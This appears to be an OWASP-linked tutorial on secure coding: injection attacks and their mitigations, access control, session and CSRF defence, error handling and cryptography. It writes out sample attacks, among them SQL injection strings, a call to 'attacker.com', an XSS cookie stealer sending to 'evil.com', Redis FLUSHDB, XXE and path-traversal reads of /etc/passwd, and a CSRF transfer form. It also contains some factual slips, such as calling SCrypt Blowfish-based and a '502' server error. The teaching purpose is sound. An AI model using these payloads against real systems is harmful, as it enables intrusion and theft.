![](assets/secure_coding.png)
# Secure Coding Principles

After exploring how to create a secure and persistent application architecture in [Secure & Resilient Design](https://dev.to/owasp/secure-and-resilient-design-2f1k) article, we have learned how to create a solid foundation for our system.
Now our goal is to ensure security in the code of its components, because about **75%** of attacks come from the application layer. We are going to describe the principles of secure coding and best solutions to implement them.

## Never Trust User Input

This is the first and most fundamental principle that you need to wrap your head around. **Any user input should be validated on the server side, and the content displayed to the user should be sanitized**.

We divide validation into 2 types: syntax validation and semantic validation.
**Syntax** validation implies that the data matches the format that we expect. For example, validating that the value entered is a number, e-mail address corresponds to a standard format, or the date is in the correct format (e.g. `YYYY-MM-DD`).
**Semantic** validation, on the other hand, checks that the data is semantically correct. This can include checking that the date of birth is not a later than current one, that the age is within a reasonable range (e.g. 0 to 150 years old), or in another field, that the transaction amount does not exceed the balance available to the account.

I'm sure most of you have heard about attack methods such as SQL, NoSQL, XSS, CMD, LDAP, and similar injections. Despite the fact of everyone knowing about them, the **Injection** vulnerability type is still at the leading positions in most applications, according to the **OWASP Top 10**. Why is this?

The problem is that developers often underestimate the complexities of security, do not consult with security as they design software, or at best rely on out-of-date security practices. Fast pace of development, business side pressures, and limited resources cause teams to focus on functionality and deadline over security. Many organizations also rely on WAF to create the illusion of total security against attacks, when in reality WAF is **addition** to other security practices. So let's say that, if Morpheus offered them a pill, they would choose the red one.

Let's refresh our memory, and look at the top application vulnerabilities caused by missing or incorrect input validation, and determine the most effective methods to mitigate them:

### SQL Injection

SQL Injection is a type of injection attack that both rookies and security experts rank as the most likely. The attack is successful if SQL syntax data is “injected” via user input in a way that is read, modified, and executed in the database.

Basic examples of SQL injection in action:

```java
String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
```

If the attacker sends `admin' --` in the input, then the final query will be:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```

`--` commenting out a password check, thus depending on the context, may give away access to the system. Obviously, in case of real attacks, we should expect more intricate payloads. 

For example, to bypass basic filters, the following are often used **Hexadecimal SQL Injection**:

```java
String query = "SELECT * FROM users WHERE user_id = " + userId;
```

Let's convert `1 OR 1=1 --` into hexadecimal format and get `0x31204F5220313D31`. If we submit this hexadecimal value into the form, we will get the following query:

```sql
SELECT * FROM users WHERE user_id = 0x31204F5220313D31
```

which is equivalent to:

```sql
SELECT * FROM users WHERE user_id = 1 OR 1=1 --
```

As should be evident by now, this will return all users.

#### How does a threat actor determine if an attack surface is vulnerable to SQL injection?

Typically, **blind SQL injections** are used to identify this vulnerability. The two most popular types are: **Time based SQL Injection** and **Out-of-Bound SQL Injection**. They are often used to identify vulnerable targets among the mined database of sites operating on the same basis (e.g. in WooCommerce).

**Time based SQL Injection**
The name speaks for itself. Let's take a look at the following example input:

```sql
' OR IF(1=1, SLEEP(10), false) --
```

The whole point of the attack is to monitor the server response time. If there are delays in the response (in our case around 10 seconds), it means that the application is vulnerable to SQL Injection and the attack can be launched.

**Out-of-Bound SQL Injection**
This is a more tedious SQL injection attack that relies on asyncronous database entries and its success depends heavily on the configuration of the target server. As an example, let's imagine that our target is using Microsoft SQL Server.

The attacker runs their server on `attacker.com` with the goal of intercepting all incoming DNS requests to the target and routing them to the attacker's server, which is the **server vulnerability identifier**.

After that, they send the following payload:

```sql
'; EXEC master..xp_dirtree '//attacker.com/sample'--.
```

If the database is misconfigured, `xp_dirtree` initiates a DNS lookup for the domain `attacker.com`, attempting to resolve the network path `//attacker.com/sample`. The attacker is not trying to steal data this way, their goal is to **detect** the presence of a vulnerability, which they do in this method as their server intercepts DNS requests to themselves.

#### Mitigation

The only appropriate solution for mitigating this type of vulnerability is to validate the input and then use `Prepared Statements`.

Validation alone **will not** save you from SQL injections. It is hard to make a universal rule, so we need to guarantee **isolation** of user input from query. Validation here acts as an additional yet **mandatory** layer of security to make sure that the data is syntactically and semantically correct.

Here's an example of a proper code, with validation and using Prepared Statement. We will use [OWASP Netryx Armor](https://github.com/OWASP/www-project-netryx/tree/main) as the validation tool:

```java
armor.validator().input().validate("username", userInput)
        .thenAccept(validated -> {
            var query = "SELECT * FROM users WHERE username = ?";

            try (var con = dataSource.getConnection()) {
                var statement = con.prepareStatement(query);
                statement.setString(1, validated);

                // execute query
            }
        });
```

If our goal is to passively block such data, machine learning models like **Naive Bayes** do a good job detecting injection attempts.

### NoSQL Injection

It is a popular misconception that NoSQL databases are not susceptible to injection attacks. The protection techniques here are the same as SQLi - input validation, data isolation and strict typing.

#### MongoDB

Despite the fact that the MongoDB driver for Java, especially in recent versions, effectively isolates the data coming inside the filters, we still need to look at examples to understand the principle of vulnerability.

Let's imagine we have an endpoint; it returns users by their name.

```
POST /api/user
Accepts: application/json
```

Searching for users looks like this under the hood:

```js
db.users.find({
  username: body["username"],
});
```

MongoDB allows you to construct complex queries that include the following operators:

- `$ne` - not equals
- `$gt` - greater than
- `$lt` - less than

If the attacker sends the following construct in the body of the request:

```json
{
  "username": { "$ne": null }
}
```

then it will construct the following query to the database:

```js
db.users.find({
  username: { $ne: null },
});
```

To describe the query in human terms, it literally means “find me all users whose `username` is not equal to `null`”.

#### Redis

In Redis, injection is possible if you use the Command-Line Interface (CLI) or if your library, through which you work with Redis, also operates through the CLI.

Let's imagine that we need to store a value obtained from a query in Redis.

```shell
SET key {user_data}
```

An attacker can use the `\n` character (line break) to execute a database query on top of their own. For example, if they submit `“userData”\nSET anotherKey “hi nosqli”`, it will cause the following commands to be executed:

```shell
SET key "userData"
SET anotherKey "hi nosqli"
```

Or worse, they can delete a base by subming:
`“userData”\nFLUSHDB` (or `FLUSHALL`, to delete all bases).

### XSS Injection

Also an extremely popular injection attack method, which unlike SQL Injection, targets the **user** rather than the server. The ultimate goal of this attack is to execute JS code in the user's browser.

There are four main varieties of this attack:

#### Stored XSS

Stored XSS occurs when an attacker submits malicious data to the server and the server then displays this data to other users.

For example, let's say we have a movie site where you can leave comments. The attacker sends a comment with the following content:

```
Very interesting film about extremely sad fairytale. <script>var img=new Image();img.src='http://evil.com/steal-cookie.php?cookie='+document.cookie;</script>
```

Once the comments have loaded, depending on the browser, the DOM tree will render the script and we'll get this final HTML:

```html
<body>
  <!--Some code--->
  <div id="comments">
    <div class="comment">
      <p>Very interesting film about extremely sad fairytale.</p>
      <script>
        var img = new Image();
        img.src = "http://evil.com/steal-cookie.php?cookie=" + document.cookie;
      </script>
    </div>
    <div class="comment">...</div>
  </div>
  <!--Some code--->
</body>
```

Depending on the browser, the `<script>` tag may be inside the `<p>` tag, but this will not prevent the script from executing.

#### Reflected XSS

Let's go by the name, an attack occurs when a malicious script is “reflected” from a web-server in response to an HTTP request. To understand this, let's look at the following scenario:

We have an endpoint `/error` with a query parameter `message` that specifies the error message. Here is an example HTML file of the page:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Error Page</title>
  </head>
  <body>
    <h1>Error Page</h1>
    <p>Your error message: <strong>${message}</strong></p>
  </body>
</html>
```

If an attacker sends a link to a user, with the following payload:
`http://example.com/error?message=%3Cscript%3Ealert('XSS');%3C%2Fscript%3E`, the server will replace the placeholder `${message}` with the value from query, and return an HTML file with the malicious script.

#### DOM-based XSS

In this type of XSS injection, all processing takes place directly on the client, bypassing the server. Let's take a look at the error screen as an example:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Error Page</title>
  </head>
  <body>
    <h1>Error Page</h1>
    <p>Your error message: <strong id="error-message"></strong></p>
    <script>
      const params = new URLSearchParams(window.location.search);
      const message = params.get("message");
      document.getElementById("error-message").innerHtml = message;
    </script>
  </body>
</html>
```

As you can see, in the case of such HTML page, the query parameter is processed by the client itself, not by the server. If this example can still be filtered through the server, the content in the case of using hashes (for example: `http://example.com/#<script>alert('XSS');</script>`), does not pass through the server and cannot be filtered by it.

#### Polymorphic XSS

Similar to polymorphic viruses, each time malicious code is executed, its code changes. To avoid pattern-based detection, the attacker often uses **multiple encoding**, and to hide the code, creates it on the fly.

For example, let's take our “innocent” script:

```html
<script>
  alert("XSS");
</script>
```

We can present it in a more complex way as well. Not so heavy obfuscation, so to say:

```html
<script>
  let a = String.fromCharCode;
  let script =
    a(60) + a(115) + a(99) + a(114) + a(105) + a(112) + a(116) + a(62);
  let code =
    a(97) +
    a(108) +
    a(101) +
    a(114) +
    a(116) +
    a(40) +
    a(39) +
    a(88) +
    a(83) +
    a(83) +
    a(39) +
    a(41);
  let end =
    a(60) + a(47) + a(115) + a(99) + a(114) + a(105) + a(112) + a(116) + a(62);
  document.write(script + code + end);
</script>
```

Now let's encode it two times and pass the parameters:
`http://example.com/?param=%253Cscript%253Elet%2520a%2520%253D%2520String.fromCharCode%253B%250Alet%2520script%2520%253D%2520a%252860%2529%2520%252B%2520a%2528115%2529%2520%252B%2520a%252899%2529%2520%252B%2520a%2528114%2529%2520%252B%2520a%2528105%2529%2520%252B%2520a%2528112%2529%2520%252B%2520a%2528116%2529%2520%252B%2520a%252862%2529%253B%250Alet%2520code%2520%253D%2520a%252897%2529%2520%252B%2520a%2528108%2529%2520%252B%2520a%2528101%2529%2520%252B%2520a%2528114%2529%2520%252B%2520a%2528116%2529%2520%252B%2520a%252840%2529%2520%252B%2520a%252839%2529%2520%252B%2520a%252888%2529%2520%252B%2520a%252883%2529%2520%252B%2520a%252883%2529%2520%252B%2520a%252839%2529%2520%252B%2520a%252841%2529%253B%250Alet%2520end%2520%253D%2520a%252860%2529%2520%252B%2520a%252847%2529%2520%252B%2520a%2528115%2529%2520%252B%2520a%252899%2529%2520%252B%2520a%2528114%2529%2520%252B%2520a%2528105%2529%2520%252B%2520a%2528112%2529%2520%252B%2520a%2528116%2529%2520%252B%2520a%252862%2529%253B%250Adocument.write%2528script%2520%252B%2520code%2520%252B%2520end%2529%253B%250A%253C%252Fscript%253E
`

This already looks harder and less comprehensible, doesn't it? To further hide their intentions, attackers can use triple and quadruple encoding. When data is passed through a query, the only limit the browser has is the **length** of the final query, not the level of encoding.

#### Mitigation

XSS occurs as a result of data either being displayed at the client side without sanitization or not being validated when it comes to the server, right?

So we need to do the following:

1. Validate the data when it comes into the server
2. Sanitize the data at the moment of issuing to the client
3. Configure a **Content-Security** policy to prevent malicious scripts from being executed by limiting script sources with the use of directives

All of this is handled by [OWASP Netryx Armor](https://github.com/OWASP/www-project-netryx/tree/main).

Validation:

```java
var userInput = ....

armor.validator().validate("ruleId", userInput)
    .thenAccept(input -> {
        // after validation
    });
```

Sanitization:

```java
var outputHtmlData = ....;
var outputJsData = ....;

var sanitizedJsData = armor.encoder().js(JavaScriptEncoderConfig.withMode(JavaScriptEnconding.HTML)
    .encode(outputJsContent);

var sanitizedHtmlData = armor.encoder().html().encode(outputHtmlData);
```

OWASP Netryx Armor configures a Netty-based web server including `Content-Security` policies right out of the box. For secure configuration of policies, it is highly recommended to refer to the [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)

### XXE Injection

Let's imagine that we provide an API for integration to partners who send us order data in XML format. Then they can view the order information from their personal dashboard.

As a result, the attacker has sent us XML of the following kind:

```xml
<?xml version="1.0"?>
<!DOCTYPE order [
  <!ELEMENT order ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<order>
  <customer>John Doe</customer>
  <items>&xxe;</items>
</order>
```

If the XML parser is misconfigured, the specified contents of the `/etc/passwd` file will be written to the `<items>` block as the injection.

#### Mitigation

It is important to configure our XML parser correctly and is a technique common to all programming languages:

1. Disable the use and loading of external DTDs (Document Type Definition)
2. Disable processing of external generic entities
3. Disable processing of external parametric entities

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

### Path Traversal Attack

This is another popular problem caused by the lack of input validation, which allows files to be retrieved outside of the server's main directory.

Let's imagine we are outputting some content on the server as follows:

```java
@Controller
public class FileDownloadController {

    private final Path rootLocation = Paths.get("/var/www/files");

    @GetMapping("/download")
    public ResponseEntity<Resource> download(@RequestParam("filename") String filename) {
          Path file = rootLocation.resolve(filename);

          Resource resource = new UrlResource(file.toUri());

          if (resource.exists())
              return ResponseEntity.ok().body(resource);

          return ResponseEntity.notFound().build();
    }
}
```

And the user performed the following query:
`GET http://your-server.com/download?filename=../../../../etc/passwd`

According to the code, the final path will be `/var/www/files/../../../../etc/passwd`, which is equivalent to `/etc/passwd`. This now means if the server has permissions to traverse to this directory, will output **the entire etc/passwd file.**

#### Mitigation

Mitigation, as I'm sure you've already guessed, is quite simple. All you need to do is **normalize** the final path and check if you are within the correct directory.

[OWASP Netryx Armor](https://github.com/OWASP/www-project-netryx) allows you to customize the desired directory and validate the resulting directory:

```java
armor.validator().path().validate(finalPath)
```

### Parameter Tampering

Let's imagine we are running our own e-commerce site. A user places an order for $100 on their personal credit card. To the server, a typical transaction would look like this: 

```html
<form action="https://sample.com/checkout" method="POST">
  <input type="hidden" name="merchant_id" value="123456" />
  <input type="hidden" name="order_id" value="78910" />
  <input type="hidden" name="amount" value="100.00" />
  <input type="hidden" name="currency" value="USD" />

  <label for="cardNumber">Card number:</label>
  <input type="text" id="cardNumber" name="cardNumber" />

  <label for="cardExpiry">Expires:</label>
  <input type="text" id="cardExpiry" name="cardExpiry" />

  <label for="cardCVC">CVC:</label>
  <input type="text" id="cardCVC" name="cardCVC" />

  <!--Other fields-->

  <button type="submit">Pay</button>
</form>
```

How does e-commerce work once that message is submitted? A user submits an order with a webhook enabled form. This form communicates order details, user data and payment data (see above) back to the merchant's server. The merchant's server then sends a message back to the user with a message like "Thanks for submitting your order!" but behind the scenes, the status message typically looks like the following:

```json
{
  "order_id": "78910",
  "merchant_id": "123456",
  "status": "success",
  ...other fields

  "signature": "abcdefghijklmn...xyz"

}
```

What if the $100 order could turn into one that was only $1.00? This attack could be accomplished via changing the order cost with developer tools on an insecure form where **input validation** fails yet still submits the order. In this described attack scenario, the server will still receive a notification with the status `success`, but the purchase amount will be different.

If the server does not check the **integrity** of data that can be changed by the user, it will lead to a `Parameter Tampering` attack. A `signature` is provided for verification on the service side. This can apply not only to fields that the user submits via forms, but also to cookie values, headers, etc.

#### Mitigation

Data that depends on user input and whose authenticity cannot be guaranteed, often due to dependency on external services beyond our control, requires protection using HMAC or digital signatures.

Imagine if you issued JWT tokens without signatures. Any user could decode the token, replace the parameters in it with their own and send them to the server.

If you will be using digital signatures, in the **Secure Cryptography** section we'll look at which algorithms are the best choice right now.

### ReDoS & RegEx Injection.

In many scenarios, we've discussed syntax validation, where we verify that the data actually conforms to the format we need. One of the most popular methods for format validation are **RegEx** expressions.

When a regular expression tries to find a match in a string, it uses a mechanism called **back-tracking**. This means that the regex “tries” different combinations to match the pattern to the text, and if something doesn't match, it goes back and tries another path.

If our regex contains constructs that cause excessive backtracking, it will cause the process to take a very long time to complete. This is often due to the use of **greedy quantifiers**: `+, *`.

Let's not go far and consider the following popular regex: `^(a+)+` with matching the following text: `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX`.
We have 2 nested greedy quantifiers here, which forces the RegEx engine to split the sequence from `a` into groups in every possible way. As a result, the number of checks we have starts to grow exponentially with each addition of `a`, and we will have a full match time of more than 30 seconds.

#### Example of injection

Let's imagine that we give users the ability to protect their social media groups from spam comments by giving them the ability to add their own regular expressions to filter messages.

If an attacker adds a regular but malicious expression, and writes a post with a lot of backtracking, it will cause the processing flow to stall.

#### Mitigation

The easiest and most effective way to defend against this attack is to limit the **time** of execution of the regular expression. This is done simply by running the validation process in a separate thread (or virtual thread) and specifying the operation timeout.

The [OWASP Netryx Armor](https://github.com/OWASP/www-project-netryx) validator is resistant to this type of attack.

## Access Control

Access control primarily involves **authenticating** the user (simply put, identifying **who** has the access) and **authorizing** them (whether they have the right to access us). **Broken Access Control** is the top #1 vulnerability that is found in applications in one way or another.

Before we look at the types of access controls, let's first establish one important rule: **All endpoints must be protected out of the box, and public endpoints must be explicitly specified, not the other way around**.

### MAC

MAC (**Mandatory Access Control**) is a strict access control model where policies are defined by the system and cannot be changed by users under any circumstances to avoid accidental or malicious escalation of rights.

Typically, in MAC we set the type of protected object, and a **security level label**. Government agencies, for example, typically use labels like **TOP SECRET**, **SECRET**, **CONFIDENTIAL**, and **UNCLASSIFIED**.

This principle also implies following the **need to know** principle, so if an entity (e.g. a user) is granted access to the **SECRET** security level, it is mandatory to specify which specific categories of that security level should be granted access to. Simply put, if you grant a user access to documents of `confidential` level, it is necessary to specify which specific types of documents the user has access to.

### DAC

DAC (**Discretionary Access Control**) is a less strict methodology than MAC for access control. In this model, access to a protected object by other entities is determined not by the system, but by the **owner** of the object. Accordingly, the use of this model is justified when users/processes have to manage access to their data themselves. The model implies that access can be granted not only to individual users, but also to certain groups to which those users are assigned.

We encounter DAC almost every day in the file system of **Unix** based operating systems and **Windows**. In it, it consists of the following parameters:

1. **File Owner** - someone who is able to grant rights to their resource.
2. **Group** - users who are allocated certain rights to the resource.
3. **Access Rights** - write/read/execute rights and combinations thereof.

### RBAC

RBAC (**Role Based Access Control**) is the most popular and used type of access control that is used in web applications. It is convenient and effective in most scenarios:

As the name implies, every entity in our system has roles assigned to it, and each role has a list of **permissions** or **policies** that are used to further determine whether it can perform a certain action or not. Roles can inherit each other's permissions.

Simply put, let's imagine we have a blog with 4 roles: USER, AUTHOR, EDITOR and ADMIN. Let's represent them in JSON format and give them the format of permissions:

```json
{
  "roles": {
    "USER": {
      "inherits": [],
      "permissions": [
        "article.view.published",
        "comment.create",
        "comment.view.*",
        "comment.edit.own",
        "comment.delete.own"
      ]
    },
    "AUTHOR": {
      "inherits": ["USER"],
      "permissions": [
        "article.create.draft",
        "article.edit.own",
        "article.view.own",
        "article.submit.for_review"
      ]
    },
    "EDITOR": {
      "inherits": ["AUTHOR"],
      "permissions": [
        "article.edit.*",
        "article.publish",
        "article.unpublish",
        "comment.moderate",
        "article.assign.to_author"
      ]
    },
    "ADMIN": {
      "inherits": ["EDITOR"],
      "permissions": [
        "user.create",
        "user.edit",
        "user.delete",
        "site.configure",
        "article.delete.*",
        "comment.delete.*",
        "site.manage_advertising"
      ]
    }
  }
}
```

In our blog management system, the **USER** role allows you to view published articles and interact with comments. **AUTHOR** inherits the `USER` rights and can additionally create and edit your articles by submitting them for review. **EDITOR** inherits the rights of `AUTHOR` and can publish, unpublish and edit only his/her articles, as well as moderate comments and assign tasks to authors. The **ADMIN** has full access to all aspects of the system, including user management, site customization, and content removal.

Often (including in our example) a **wildcard** is allowed in the permissions to mean **ALL**. For example, we have the permissions:

- `article.delete.own` - Gives the right to delete your own articles.
- `article.delete.userid` - The right to delete a user with ID `userid`.

And now we want to give `EDITOR` the right to delete all articles. In this case, we write:

- `article.delete.*` - Here `*` is a wildcard.

Often, in addition to roles, users are also allowed to assign additional rights (or take away rights that their role has).
In order to take away a right, the `-` sign is usually added before the right. For example, to take away the right to moderate comments from a user with the **EDITOR** role, we add the following policy:

- `-comment.moderate` _note that “-” at the beginning_.

## Session Management

Once we authenticate a user, we create a session for them, and further store their session ID in cookies. The important thing here is to make sure we have considered all the risks during the authentication process and afterwards, so let's look at the main threats we need to consider:

### Session Fixation

The goal of this attack is simple and straightforward - the attacker must make a legitimate user authorize with the **attacker's** session ID.

Let's consider a simple example:
Depending on the web server architecture, it is often allowed to pass the session ID not via Cookies, but via Query parameters (this is especially possible if the user blocks cookies).
As a result, when attempting to authorize, the attacker is given the session ID (e.g. `/login?sid=ABCDEFGH....`. Using phishing or any other methods, they can force the user to click on the link where their session ID is specified and authorize, after which the attacker is authorized along with the user.

#### Mitigation

The mitigation of this attack vector is obvious - after a user is successfully authenticated, their current session ID should **reset**. In most of popular web frameworks (including Spring Boot, Quarkus), this is the default behavior, but it worth specifying, in case something is changed:

```java
@Bean
public SecurityFilterChain secure(HttpSecurity http) throws Exception {
    return http.sessionManagement(session -> session.sessionFixation().migrateSession())
            .build();
}
```

### CSRF Attacks

CSRF **(Crosst Site Request Forgery)**, also known as XSRF, is a type of attack on web applications where the attacker's goal is to perform an action on behalf of a user already authenticated to the system. That is, the attacker's goal is to trick the user into accidentally clicking on a special link or downloading a specific resource (such as an image), which will result in a request being executed on the user's behalf on another site where the user is authorized. For example, the website to which the user was redirected by the attacker may have had such a form and a script when downloading:

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000" />
  <input type="hidden" name="to_account" value="123456789" />
</form>

<script>
  document.forms[0].submit();
</script>
```

Clearly, in real-world scenarios, scripts are much more sophisticated, but techniques for defending against CSRF attacks are effective for all:

#### Mitigation

**CSRF tokens**
The most popular method of CSRF protection is the use of **CSRF** tokens. These are random tokens that are issued after authentication, which can even be stored directly in forms issued to the user. Most web frameworks support them out of the box:

```java
@Bean
public SecurityFilterChain secure(HttpSecurity http) throws Exception {
    return http.sessionManagement(session -> session.sessionFixation().migrateSession()) // migrating session as in previous example
            .csrf(csrf -> csrf.csrfTokenRepository(/* your repository */)) // enabling CSRF
            .build();
}
```

However, depending on security requirements, they can be issued according to the following principle:

- **For most applications**: 1 CSRF token per session. When the session is reset/updated, the token will be updated.
- **For high risk applications**: CSRF token should be updated every request sent by the user (e.g. issued in `X-CSRF-TOKEN` header for subsequent request)

**Same-Site attribute setting**
If the application architecture allows, you can set the **Same-Site** attribute to `Strict` or `Lax` by session cookies. This will let the browser know that in the case of `Strict`, the cookie can only be sent if the user interacts on the site for **all requests**, and in the case of `Lax`, to restrict sending only with _insecure_ requests (e.g. POST requests).

**Use of tokens instead of sessions**
Using JWT tokens instead of cookie sessions, and sending them in **headers** is a viable option to protect against CSRF attacks, because it requires access to `localStorage` which is separated between sites, but still, practices described above are a good tone.

## Secure Error Handling

Our application, like any other information system goes from one state to another, and it is possible that eventually we will have to switch to the **error** state.
We've already discussed this in a previous article, but let's do it again. Once an application fails and is in error state, it is critical for it to **fail safe**. An error can be considered to be failing safe if:

1. No technical details of the system were issued as a result of the error
2. The integrity and confidentiality of data has not been compromised
3. The system was able to return to a normal, operational state
4. The information about the error was properly logged, for further analysis

In the context of secure programming, we especially need to pay attention to how we handle errors in our application. In many web frameworks like Spring Boot error handling is centralized, allowing them to be handled very efficiently.

By default, in case an error we don't know is called (trivially, `IllegalStateException`, it can stand for anything), most frameworks will handle it in a response with the status code `502 Internal Server Error`, and **put the stacktrace right in the response**. This is a direct path to **Information Disclosure** - it will give away a lot of information not just about the application's programming language, but about its internal structure. It exists only to speed up the development process so that you don't have to connect to the server an extra time to see the error, but when you go into **production**, this behavior **must** be disabled.

**Information Disclosure** is actually a very dangerous error that can lead to catastrophic consequences. Don't forget, if your application becomes a target for attackers, the very first and almost the most basic step in exploiting vulnerabilities is **gathering information about the system**. Because knowing how your system is organized makes it much easier to find vulnerabilities in it.

What have we learned from this? It is much easier and more convenient to designate a number of custom errors that are under our control (i.e. we will understand what exactly went wrong) and process them in a centralized way. And all other errors unknown to us - securely logged without issuing a stacktrace to the user. _Securely logged_ means that even though logs are stored locally (or on some log server), they should not contain sensitive information (e.g. API keys, passwords, etc.). Failure to do so will come back to bite you in case of certain internal threats.

For example, let's imagine that a user wants to find some order by ID. In case it is not found, we will call our own `OrderNotFoundException` error:

```java
public class OrderNotFoundException extends RuntimeException {
    private final long orderId;

    public OrderNotFoundException(long orderId) {
        this.orderId = orderId;
    }

    public long getOrderId() {
        return orderId;
    }
}
```

Let's declare a general error style, specifying the message we can display to the user:

```java
public class ErrorResponse {
    private final String errorCode;
    private final String errorMessage;

    public ErrorResponse(String errorCode, String errorMessage) {
        this.errorCode = errorCode;
        this.errorMessage = errorMessage;
    }

    public String getErrorCode() {
        return errorCode;
    }

    public String getErrorMessage() {
        return errorMessage;
    }
}
```

And finally process them. Don't forget, we process all the errors we know about, and the unknown ones are logged and returned to the user as little information as possible.

```java
@ControllerAdvice
public class GlobalExceptionHandler {

    private static final Logger logger = LoggerFactory.getLogger(GlobalExceptionHandler.class);

    @ExceptionHandler(OrderNotFoundException.class)
    public ResponseEntity<ErrorResponse> handleOrderNotFound(OrderNotFoundException ex) {
        ErrorResponse errorResponse = new ErrorResponse(
                "ORDER_NOT_FOUND",
                "Order with ID " + ex.getOrderId() + " not found"
        );
        return new ResponseEntity<>(errorResponse, HttpStatus.NOT_FOUND);
    }}

    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> handleUnknown(Exception ex) {
        logger.error("An unexpected error occurred: {}", ex.getMessage(), ex);

        ErrorResponse errorResponse = new ErrorResponse(
                "INTERNAL_SERVER_ERROR",
                "An unexpected error occurred. Please try again later."
        );
        return new ResponseEntity<>(errorResponse, HttpStatus.INTERNAL_SERVER_ERROR);
    }
}
```

Ideally, we should not only log unknown errors, but also use a centralized **Error Tracker** like [Sentry](https://sentry.io/welcome/). This will allow us to **react** in time, especially if the unexpected error is critical:

```java
    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> handleUnknown(Exception ex) {
        logger.error("An unexpected error occurred: {}", ex.getMessage(), ex);

        Sentry.captureException(e);

        ErrorResponse errorResponse = new ErrorResponse(
                "INTERNAL_SERVER_ERROR",
                "An unexpected error occurred. Please try again later."
        );
        return new ResponseEntity<>(errorResponse, HttpStatus.INTERNAL_SERVER_ERROR);
    }
```

Now let's summarize what we should have understood from here:

1. You cannot allow technical information to be leaked to users. This will give attackers a greater chance to exploit your system.
2. Logging errors for further analysis is a good practice, but you should not let sensitive information get into the logs.
3. Do not generalize errors (e.g. by throwing `RuntimeException`), but specify them for clear processing.
4. For rapid response to unexpected errors, it is good practice to use centralized Error trackers.

## Secure Cryptography

When we work with sensitive data, we rely on cryptography. For example:
**hash** data that we don't need to know the original form of (e.g. passwords)
**encrypt** data that we need to revert to its original form (e.g. data transfers)
**sign** data that we need to ensure the integrity of (e.g. JWT tokens)

Before we move on to cryptography solutions, remember one golden rule: **Do not try to create your own cryptographic algorithm. Leave the cryptography to the cryptographers**.

### Secure Hashing

When it comes to hashing algorithms, we divide them into **fast** and **slow**. We only use fast hashing algorithms where speed is important, such as for **signing** and verifying the **integrity** of data. These include:

- **SHA-256**
- **SHA-1**
- **SHA-3**
- **MD5** - _Deprecated for cryptographic operations and is only valid as a noncryptographic checksum_.

Slow algorithms are most often used to hash **confidential** data for later storage, because they are designed to require more processing power (e.g. memory consumption, CPU) to be resistant to types of attacks like **brute force**:

- **BCrypt** - One of the most popular hashing algorithms, which is most common already in legacy systems. Good, but not resistant to high-performance attacks on specialized devices.

- **SCrypt** - Unlike BCrypt, an algorithm based on **Blowfish** that is resistant to attacks using parallel computing (e.g. GPUs).

- **Argon2id** - Winner of the Password Hashing Competition (PHC) in 2015 and the most flexible among the described algorithms, which allows to customize the hashing complexity for different security requirements.

Very often, in addition to **Brute Force** attacks, attackers use **Rainbow Hash Tables** to retrieve the original data (i.e. passwords) from their hash. These tables contain pre-computed hashes for a wide range of passwords, and while slow hashes make it difficult for the attacker (due to resource consumption), the most effective method of dealing with them is to use **Salt** and **Pepper**.

**Salt** is a randomized set of bytes/symbols, most often at least 16-32 bytes long, that is added to the beginning or end of our data before hashing. It is stored in **open** form and is **unique** to each data that we hash.

The **Pepper** is exactly the same random set of bytes, which unlike Salt is **secret** and **NOT** unique for each chunk of data (i.e. 1 pepper for all passwords). It acts as an additional layer of defense and should be kept separate from our data. For example, if an attacker gains access to the password database, not knowing the pepper will make it nearly impossible to retrieve the original passwords.

### Secure encryption

Encryption comes in two types - **symmetric** and **asymmetric**. While symmetric encryption uses a single key to encrypt and decrypt data, asymmetric encryption has 2 keys: **public** for data encryption and **private** for decryption. It is important to use only up-to-date encryption algorithms that are invulnerable to brute force attacks, resistant to ciphertext analysis and simply effective in our realities.

The most secure symmetric algorithms currently available include:

- **AES** with **GCM** mode (preferably 256 bits), which is often hardware accelerated.

- **ChaCha20-Poly1305** - A stream cipher, particularly effective compared to AES in scenarios where there is no hardware acceleration for AES.

We can use both of these ciphers with **Bouncy Castle**:

```java
public class ChaCha20Poly1305Cipher {

    public byte[] encrypt(byte[] key, byte[] nonce, byte[] data) {
        return processCipher(true, key, nonce, data);
    }

    public byte[] decrypt(byte[] key, byte[] nonce, byte[] encrypted) {
        return processCipher(false, key, nonce, encrypted);
    }

    private byte[] processCipher(boolean forEncryption, byte[] key, byte[] nonce, byte[] input) {
        ChaCha20Poly1305 cipher = new ChaCha20Poly1305();
        cipher.init(forEncryption, new ParametersWithIV(new KeyParameter(key), nonce));

        byte[] output = new byte[cipher.getOutputSize(input.length)];
        int len = cipher.processBytes(input, 0, input.length, output, 0);

        try {
            cipher.doFinal(output, len);
        } catch (InvalidCipherTextException e) {
            throw new IllegalStateException("Cipher operation failed", e);
        }

        return output;
    }
}
```

```java
public class AesGcmCipher {
    private static final int GCM_NONCE_LENGTH = 12;
    private static final int GCM_MAC_SIZE = 128;

    public byte[] encrypt(byte[] key, byte[] nonce, byte[] data) {
        return processCipher(true, key, nonce, data);
    }

    public byte[] decrypt(byte[] key, byte[] nonce, byte[] encrypted) {
        return processCipher(false, key, nonce, encrypted);
    }

    private byte[] processCipher(boolean forEncryption, byte[] key, byte[] nonce, byte[] input) {
        if (nonce.length != GCM_NONCE_LENGTH) {
            throw new IllegalArgumentException("Invalid nonce size for GCM: must be " + GCM_NONCE_LENGTH + " bytes.");
        }

        GCMBlockCipher cipher = new GCMBlockCipher(new AESEngine());
        AEADParameters parameters = new AEADParameters(new KeyParameter(key), GCM_MAC_SIZE, nonce);
